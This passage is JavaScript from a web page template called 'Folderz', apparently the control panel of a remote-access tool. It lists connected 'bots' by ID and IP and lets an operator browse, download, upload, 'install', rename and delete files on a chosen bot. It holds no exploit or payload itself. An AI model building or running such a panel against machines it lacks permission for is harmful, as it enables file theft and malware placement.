  toast.style.cssText = 'position:fixed;bottom:30px;right:30px;padding:14px 22px;background:rgba(15,15,24,0.98);color:' + (colors[type] || colors.info) + ';border:2px solid ' + (colors[type] || colors.info) + ';border-radius:8px;font-family:monospace;font-size:12px;font-weight:700;z-index:99999;box-shadow:0 0 30px ' + (colors[type] || colors.info) + ';max-width:400px;word-wrap:break-word;';
  document.body.appendChild(toast);
  setTimeout(function() {
    toast.style.opacity = '0';
    toast.style.transition = 'opacity 0.3s';
    setTimeout(function() { toast.remove(); }, 300);
  }, 3000);
}

// ════════════════════════════════════════════════════════════
// 📝 INPUT MODAL
// ════════════════════════════════════════════════════════════
var _inputCallback = null;

function openInputModal(opts) {
  document.getElementById('inputIcon').innerHTML = opts.icon || FILE_ICONS.dir;
  document.getElementById('inputTitle').textContent = opts.title || 'Input';
  document.getElementById('inputLabel1').textContent = opts.label1 || 'Name:';
  document.getElementById('inputField1').value = opts.value1 || '';
  document.getElementById('inputField1').placeholder = opts.placeholder1 || '';
  if (opts.showField2) {
    document.getElementById('inputField2Wrap').style.display = 'block';
    document.getElementById('inputLabel2').textContent = opts.label2 || 'Content:';
    document.getElementById('inputField2').value = opts.value2 || '';
    document.getElementById('inputField2').placeholder = opts.placeholder2 || '';
  } else {
    document.getElementById('inputField2Wrap').style.display = 'none';
  }
  _inputCallback = opts.onSubmit;
  document.getElementById('inputBackdrop').classList.add('show');
  document.getElementById('inputModal').classList.add('show');
  setTimeout(function() {
    document.getElementById('inputField1').focus();
  }, 200);
}

function closeInputModal() {
  document.getElementById('inputBackdrop').classList.remove('show');
  document.getElementById('inputModal').classList.remove('show');
  _inputCallback = null;
}

function submitInputModal() {
  var v1 = document.getElementById('inputField1').value;
  var v2 = document.getElementById('inputField2').value;
  if (_inputCallback) {
    var cb = _inputCallback;
    closeInputModal();
    cb(v1, v2);
  } else {
    closeInputModal();
  }
}

// ════════════════════════════════════════════════════════════
// 📥 LOAD BOTS
// ════════════════════════════════════════════════════════════
async function loadBots() {
  try {
    const res = await fetch('/api/all_bots');
    if (res.status === 401) { window.location.href = '/'; return; }
    const bots = await res.json();
    const select = document.getElementById('botSelect');
    if (!select) return;
    const currentValue = select.value;
    select.innerHTML = '<option value="">-- Select a bot --</option>';
    if (!Array.isArray(bots)) return;
    if (bots.length === 0) {
      const opt = document.createElement('option');
      opt.value = '';
      opt.textContent = '⚠️ No bots connected';
      opt.disabled = true;
      select.appendChild(opt);
      return;
    }
    bots.forEach(function(b) {
      const opt = document.createElement('option');
      opt.value = b.id;
      opt.textContent = (b.isOnline ? '🟢 ' : '🔴 ') + b.id + ' (' + (b.ip || '?') + ')';
      select.appendChild(opt);
    });
    var savedBot = null;
    try { savedBot = localStorage.getItem('folderz_selectedBot'); } catch (e) {}
    if (savedBot && bots.some(function(b) { return b.id === savedBot; })) {
      select.value = savedBot;
      selectedBot = savedBot;
      const statusEl = document.getElementById('botStatus');
      if (statusEl) {
        statusEl.textContent = '🎯 ' + savedBot;
        statusEl.style.color = 'var(--green)';
      }
    } else if (currentValue) {
      select.value = currentValue;
    }
  } catch (e) { console.error(e); }
}

function onBotChange() {
  const select = document.getElementById('botSelect');
  selectedBot = select.value || null;
  const statusEl = document.getElementById('botStatus');
  if (selectedBot) {
    try { localStorage.setItem('folderz_selectedBot', selectedBot); } catch (e) {}
    statusEl.textContent = '🎯 ' + selectedBot;
    statusEl.style.color = 'var(--green)';
    loadFiles();
  } else {
    try { localStorage.removeItem('folderz_selectedBot'); } catch (e) {}
    statusEl.textContent = '';
  }
}

// ════════════════════════════════════════════════════════════
// 📂 LOAD FILES
// ════════════════════════════════════════════════════════════
async function loadFiles() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  const path = document.getElementById('pathInput').value.trim() || '/';
  currentPath = path;
  try { localStorage.setItem('folderz_currentPath', path); } catch (e) {}
  const list = document.getElementById('fileList');
  list.innerHTML = '<div class="loading">Loading...</div>';
  try {
    const res = await fetch('/api/list_files', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: path })
    });
    const data = await res.json();
    if (data.status !== 'ok') {
      list.innerHTML = '<div class="loading" style="color:var(--accent-red);">❌ ' + escapeHtml(data.message || 'Error') + '</div>';
      return;
    }
    currentFiles = data.files || [];
    renderFiles();
  } catch (e) {
    list.innerHTML = '<div class="loading" style="color:var(--accent-red);">❌ Network error</div>';
  }
}

function renderFiles() {
  const list = document.getElementById('fileList');
  document.getElementById('fileCount').textContent = currentFiles.length + ' items';
  if (currentFiles.length === 0) {
    list.innerHTML = '<div class="loading">📂 Empty folder</div>';
    return;
  }
  list.innerHTML = '';
  currentFiles.forEach(function(f, idx) {
    const item = document.createElement('div');
    item.className = 'file-item';
    item.dataset.index = idx;
    
    var fileType = getFileType(f.name, f.type === 'dir');
    
    let sizeStr = '';
    if (f.type === 'file') {
      const size = f.size || 0;
      if (size < 1024) sizeStr = size + 'B';
      else if (size < 1024*1024) sizeStr = (size/1024).toFixed(1) + 'KB';
      else if (size < 1024*1024*1024) sizeStr = (size/(1024*1024)).toFixed(1) + 'MB';
      else sizeStr = (size/(1024*1024*1024)).toFixed(1) + 'GB';
    }
    
    item.innerHTML = 
      '<div class="file-icon ' + fileType.type + '">' + fileType.icon + '</div>' +
      '<span class="file-name' + (f.type === 'dir' ? ' is-dir' : '') + '">' + escapeHtml(f.name) + '</span>' +
      '<div class="file-meta">' +
        (sizeStr ? '<span class="file-size">' + sizeStr + '</span>' : '') +
        '<span class="file-type">' + fileType.label + '</span>' +
      '</div>';
    
    item.addEventListener('click', function() { selectFile(idx); });
    item.addEventListener('dblclick', function() {
      if (f.type === 'dir') {
        setPath(cleanPath(currentPath) + '/' + f.name);
      } else {
        openEditor(idx);
      }
    });
    list.appendChild(item);
  });
}

function selectFile(idx) {
  document.querySelectorAll('.file-item').forEach(function(el) { el.classList.remove('selected'); });
  const item = document.querySelector('.file-item[data-index="' + idx + '"]');
  if (item) item.classList.add('selected');
  selectedFile = currentFiles[idx];
}

function setPath(p) {
  document.getElementById('pathInput').value = p;
  try { localStorage.setItem('folderz_currentPath', p); } catch (e) {}
  loadFiles();
}

function cleanPath(p) {
  var s = String(p || '');
  while (s.length > 1 && s.charAt(s.length - 1) === '/') {
    s = s.slice(0, -1);
  }
  return s;
}

// ════════════════════════════════════════════════════════════
// 📝 FILE EDITOR
// ════════════════════════════════════════════════════════════
var editingFilePath = null;

async function openEditor(idx) {
  const f = currentFiles[idx];
  if (!f) return;
  if (f.type === 'dir') return;
  const remotePath = cleanPath(currentPath) + '/' + f.name;
  editingFilePath = remotePath;
  
  var fileType = getFileType(f.name, false);
  
  document.getElementById('editorFileIcon').innerHTML = fileType.icon;
  document.getElementById('editorFileName').textContent = f.name;
  document.getElementById('editorSize').textContent = (f.size || 0) + 'B';
  document.getElementById('editorStatus').textContent = 'Loading...';
  document.getElementById('editorTextarea').value = '';
  document.getElementById('editorBackdrop').classList.add('show');
  document.getElementById('editorModal').classList.add('show');
  try {
    const res = await fetch('/api/download_file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: remotePath })
    });
    const data = await res.json();
    if (data.status !== 'ok') {
      document.getElementById('editorTextarea').value = '❌ Failed to load: ' + (data.message || 'Error');
      document.getElementById('editorStatus').textContent = 'Error';
      return;
    }
    const binary = atob(data.b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    const text = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
    document.getElementById('editorTextarea').value = text;
    document.getElementById('editorStatus').textContent = '✓ Loaded (' + text.length + ' chars)';
  } catch (e) {
    document.getElementById('editorTextarea').value = '❌ Error: ' + e.message;
    document.getElementById('editorStatus').textContent = 'Error';
  }
}

async function saveFile() {
  if (!editingFilePath) return;
  const text = document.getElementById('editorTextarea').value;
  const status = document.getElementById('editorStatus');
  status.textContent = '⏳ Saving...';
  try {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(text);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
    const b64 = btoa(binary);
    const res = await fetch('/api/upload_file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: editingFilePath, b64: b64 })
    });
    const data = await res.json();
    if (data.status === 'ok') {
      status.textContent = '✓ Saved (' + text.length + ' chars)';
      status.style.color = 'var(--green)';
      showToast('✅ File saved', 'success');
      setTimeout(function() { status.style.color = ''; }, 3000);
    } else {
      status.textContent = '❌ Save failed: ' + (data.message || 'Error');
      status.style.color = 'var(--accent-red)';
      showToast('❌ Save failed', 'error');
    }
  } catch (e) {
    status.textContent = '❌ Error: ' + e.message;
    status.style.color = 'var(--accent-red)';
    showToast('❌ Error: ' + e.message, 'error');
  }
}

function closeEditor() {
  document.getElementById('editorBackdrop').classList.remove('show');
  document.getElementById('editorModal').classList.remove('show');
  editingFilePath = null;
}

// ════════════════════════════════════════════════════════════
// 1) 📥 DOWNLOAD FILE
// ════════════════════════════════════════════════════════════
async function downloadSelected() {
  if (!selectedFile) { showToast('❌ Select a file first', 'error'); return; }
  if (selectedFile.type === 'dir') { showToast('⚠️ Use "Down Folder"', 'warning'); return; }
  const remotePath = cleanPath(currentPath) + '/' + selectedFile.name;
  showToast('⏳ Downloading...', 'info');
  try {
    const res = await fetch('/api/download_file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: remotePath })
    });
    const data = await res.json();
    if (data.status !== 'ok') { showToast('❌ ' + (data.message || 'Failed'), 'error'); return; }
    const binary = atob(data.b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    const blob = new Blob([bytes]);
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = selectedFile.name;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast('✅ Downloaded: ' + selectedFile.name, 'success');
  } catch (e) { showToast('❌ Error: ' + e.message, 'error'); }
}

// ════════════════════════════════════════════════════════════
// 2) 📁 DOWNLOAD FOLDER
// ════════════════════════════════════════════════════════════
async function downloadFolder() {
  if (!selectedFile) { showToast('❌ Select a folder first', 'error'); return; }
  if (selectedFile.type !== 'dir') { showToast('⚠️ Select a folder', 'warning'); return; }
  const folderPath = cleanPath(currentPath) + '/' + selectedFile.name;
  showToast('⏳ Downloading folder...', 'info');
  try {
    const res = await fetch('/api/list_files', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: folderPath })
    });
    const data = await res.json();
    if (data.status !== 'ok') { showToast('❌ Error', 'error'); return; }
    const files = data.files || [];
    if (files.length === 0) { showToast('⚠️ Folder is empty', 'warning'); return; }
    let downloaded = 0;
    for (const f of files) {
      if (f.type === 'file') {
        const remotePath = folderPath + '/' + f.name;
        const res2 = await fetch('/api/download_file', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: selectedBot, path: remotePath })
        });
        const d2 = await res2.json();
        if (d2.status === 'ok') {
          const binary = atob(d2.b64);
          const bytes = new Uint8Array(binary.length);
          for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
          const blob = new Blob([bytes]);
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url; a.download = f.name;
          document.body.appendChild(a); a.click(); document.body.removeChild(a);
          URL.revokeObjectURL(url);
          downloaded++;
        }
      }
    }
    showToast('✅ Downloaded ' + downloaded + ' files', 'success');
  } catch (e) { showToast('❌ Error: ' + e.message, 'error'); }
}

// ════════════════════════════════════════════════════════════
// 3) 📤 UPLOAD FILE
// ════════════════════════════════════════════════════════════
function uploadFile() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  const input = document.createElement('input');
  input.type = 'file';
  input.onchange = function() {
    const file = input.files[0];
    if (!file) return;
    openInputModal({
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
      title: 'Upload File',
      label1: 'Remote path:',
      value1: cleanPath(currentPath) + '/' + file.name,
      showField2: false,
      onSubmit: function(remoteName) {
        if (!remoteName) return;
        showToast('⏳ Uploading ' + file.name + '...', 'info');
        const reader = new FileReader();
        reader.onload = async function(e) {
          const b64 = e.target.result.split(',')[1];
          const res = await fetch('/api/upload_file', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: selectedBot, path: remoteName, b64: b64 })
          });
          const data = await res.json();
          if (data.status === 'ok') {
            showToast('✅ Uploaded: ' + file.name, 'success');
            await loadFiles();
          } else {
            showToast('❌ ' + (data.message || 'Failed'), 'error');
          }
        };
        reader.readAsDataURL(file);
      }
    });
  };
  input.click();
}

// ════════════════════════════════════════════════════════════
// 4) 🗂️ UPLOAD FOLDER
// ════════════════════════════════════════════════════════════
function uploadFolder() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  const input = document.createElement('input');
  input.type = 'file';
  input.webkitdirectory = true;
  input.directory = true;
  input.multiple = true;
  input.onchange = function() {
    const files = Array.from(input.files);
    if (files.length === 0) return;
    openInputModal({
      icon: FILE_ICONS.dir,
      title: 'Upload Folder',
      label1: 'Remote folder name:',
      value1: files[0].webkitRelativePath.split('/')[0],
      showField2: false,
      onSubmit: async function(folderName) {
        if (!folderName) return;
        const basePath = cleanPath(currentPath) + '/' + folderName;
        showToast('⏳ Uploading ' + files.length + ' files...', 'info');
        let uploaded = 0;
        for (const file of files) {
          const relativePath = file.webkitRelativePath.split('/').slice(1).join('/');
          if (!relativePath) continue;
          const remotePath = basePath + '/' + relativePath;
          const parentDir = remotePath.substring(0, remotePath.lastIndexOf('/'));
          await fetch('/api/mkdir', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: selectedBot, path: parentDir })
          });
          const reader = new FileReader();
          await new Promise(function(resolve) {
            reader.onload = async function(e) {
              const b64 = e.target.result.split(',')[1];
              await fetch('/api/upload_file', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: selectedBot, path: remotePath, b64: b64 })
              });
              uploaded++;
              resolve();
            };
            reader.readAsDataURL(file);
          });
        }
        showToast('✅ Uploaded ' + uploaded + ' files', 'success');
        await loadFiles();
      }
    });
  };
  input.click();
}

// ════════════════════════════════════════════════════════════
// 5) ➕ NEW FOLDER
// ════════════════════════════════════════════════════════════
function createFolder() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  openInputModal({
    icon: FILE_ICONS.dir,
    title: 'New Folder',
    label1: 'Folder name:',
    placeholder1: 'my_folder',
    showField2: false,
    onSubmit: async function(name) {
      if (!name || !name.trim()) return;
      const path = cleanPath(currentPath) + '/' + name.trim();
      showToast('⏳ Creating folder...', 'info');
      try {
        const res = await fetch('/api/mkdir', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: selectedBot, path: path })
        });
        const data = await res.json();
        if (data.status === 'ok') {
          showToast('✅ ' + (data.output || 'Folder created'), 'success');
          await loadFiles();
        } else {
          showToast('❌ ' + (data.message || data.output || 'Failed'), 'error');
        }
      } catch (e) {
        showToast('❌ Error: ' + e.message, 'error');
      }
    }
  });
}

// ════════════════════════════════════════════════════════════
// 6) 📝 NEW FILE
// ════════════════════════════════════════════════════════════
function createFile() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  openInputModal({
    icon: FILE_ICONS.txt,
    title: 'New File',
    label1: 'File name:',
    placeholder1: 'test.txt',
    label2: 'Content:',
    placeholder2: 'Hello World...',
    showField2: true,
    onSubmit: async function(name, content) {
      if (!name || !name.trim()) return;
      const path = cleanPath(currentPath) + '/' + name.trim();
      showToast('⏳ Creating file...', 'info');
      try {
        const encoder = new TextEncoder();
        const bytes = encoder.encode(content || '');
        let binary = '';
        for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        const b64 = btoa(binary);
        const res = await fetch('/api/upload_file', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: selectedBot, path: path, b64: b64 })
        });
        const data = await res.json();
        if (data.status === 'ok') {
          showToast('✅ File created: ' + name, 'success');
          await loadFiles();
        } else {
          showToast('❌ ' + (data.message || data.output || 'Failed'), 'error');
        }
      } catch (e) {
        showToast('❌ Error: ' + e.message, 'error');
      }
    }
  });
}

// ════════════════════════════════════════════════════════════
// 7) ⚡ INSTALL FILE
// ════════════════════════════════════════════════════════════
function installFile() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  const input = document.createElement('input');
  input.type = 'file';
  input.onchange = function() {
    const file = input.files[0];
    if (!file) return;
    openInputModal({
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
      title: 'Install File',
      label1: 'Install name:',
      value1: file.name,
      showField2: false,
      onSubmit: function(name) {
        if (!name) return;
        openInputModal({
          icon: FILE_ICONS.dir,
          title: 'Target Directory',
          label1: 'Directory:',
          value1: currentPath,
          showField2: false,
          onSubmit: function(dir) {
            if (!dir) return;
            const remotePath = cleanPath(dir) + '/' + name;
            showToast('⏳ Installing...', 'info');
            const reader = new FileReader();
            reader.onload = async function(e) {
              const b64 = e.target.result.split(',')[1];
              const res = await fetch('/api/upload_file', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: selectedBot, path: remotePath, b64: b64 })
              });
              const data = await res.json();
              if (data.status === 'ok') {
                showToast('✅ Installed: ' + remotePath, 'success');
                await loadFiles();
              } else {
                showToast('❌ ' + (data.message || 'Failed'), 'error');
              }
            };
            reader.readAsDataURL(file);
          }
        });
      }
    });
  };
  input.click();
}

// ════════════════════════════════════════════════════════════
// 8) 📦 INSTALL FOLDER
// ════════════════════════════════════════════════════════════
function installFolder() {
  if (!selectedBot) { showToast('❌ Select a bot first', 'error'); return; }
  const input = document.createElement('input');
  input.type = 'file';
  input.webkitdirectory = true;
  input.directory = true;
  input.multiple = true;
  input.onchange = function() {
    const files = Array.from(input.files);
    if (files.length === 0) return;
    openInputModal({
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>',
      title: 'Install Folder',
      label1: 'Install folder name:',
      value1: files[0].webkitRelativePath.split('/')[0],
      showField2: false,
      onSubmit: function(folderName) {
        if (!folderName) return;
        openInputModal({
          icon: FILE_ICONS.dir,
          title: 'Target Directory',
          label1: 'Directory:',
          value1: currentPath,
          showField2: false,
          onSubmit: async function(dir) {
            if (!dir) return;
            const basePath = cleanPath(dir) + '/' + folderName;
            showToast('⏳ Installing ' + files.length + ' files...', 'info');
            let uploaded = 0;
            for (const file of files) {
              const relativePath = file.webkitRelativePath.split('/').slice(1).join('/');
              if (!relativePath) continue;
              const remotePath = basePath + '/' + relativePath;
              const parentDir = remotePath.substring(0, remotePath.lastIndexOf('/'));
              await fetch('/api/mkdir', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: selectedBot, path: parentDir })
              });
              const reader = new FileReader();
              await new Promise(function(resolve) {
                reader.onload = async function(e) {
                  const b64 = e.target.result.split(',')[1];
                  await fetch('/api/upload_file', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: selectedBot, path: remotePath, b64: b64 })
                  });
                  uploaded++;
                  resolve();
                };
                reader.readAsDataURL(file);
              });
            }
            showToast('✅ Installed ' + uploaded + ' files', 'success');
            await loadFiles();
          }
        });
      }
    });
  };
  input.click();
}

// ════════════════════════════════════════════════════════════
// 9) ✏️ RENAME
// ════════════════════════════════════════════════════════════
function renameSelected() {
  if (!selectedFile) { showToast('❌ Select a file/folder first', 'error'); return; }
  const oldName = selectedFile.name;
  openInputModal({
    icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>',
    title: 'Rename',
    label1: 'New name:',
    value1: oldName,
    showField2: false,
    onSubmit: async function(newName) {
      if (!newName || newName === oldName) return;
      const oldPath = cleanPath(currentPath) + '/' + oldName;
      const newPath = cleanPath(currentPath) + '/' + newName;
      showToast('⏳ Renaming...', 'info');
      try {
        const res = await fetch('/api/rename', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: selectedBot, old: oldPath, new: newPath })
        });
        const data = await res.json();
        if (data.status === 'ok') {
          showToast('✅ Renamed', 'success');
          await loadFiles();
        } else {
          showToast('❌ ' + (data.message || 'Failed'), 'error');
        }
      } catch (e) {
        showToast('❌ Error: ' + e.message, 'error');
      }
    }
  });
}

// ════════════════════════════════════════════════════════════
// 10) 🗑 DELETE
// ════════════════════════════════════════════════════════════
async function deleteSelected() {
  if (!selectedFile) { showToast('❌ Select a file/folder first', 'error'); return; }
  const remotePath = cleanPath(currentPath) + '/' + selectedFile.name;
  if (!confirm('🗑 Delete "' + remotePath + '"?')) return;
  showToast('⏳ Deleting...', 'info');
  try {
    const res = await fetch('/api/delete_path', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, path: remotePath })
    });
    const data = await res.json();
    if (data.status === 'ok') {
      showToast('✅ ' + (data.output || 'Deleted'), 'success');
      await loadFiles();
    } else {
      showToast('❌ ' + (data.message || 'Failed'), 'error');
    }
  } catch (e) {
    showToast('❌ Error: ' + e.message, 'error');
  }
}

// ════════════════════════════════════════════════════════════
// 🛡️ HELPERS
// ════════════════════════════════════════════════════════════
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, function(c) {
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
  });
}

// ════════════════════════════════════════════════════════════
// 🚀 INIT
// ════════════════════════════════════════════════════════════
function initFolderz() {
  try {
    const savedPath = localStorage.getItem('folderz_currentPath');
    if (savedPath) {
      const pathInput = document.getElementById('pathInput');
      if (pathInput) {
        pathInput.value = savedPath;
        currentPath = savedPath;
      }
    }
  } catch (e) {}
  loadBots();
  setInterval(loadBots, 15000);
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initFolderz);
} else {
  initFolderz();
}
</scr` + `ipt>
`;

  return getLayout("Folderz", content, "folderz");
}
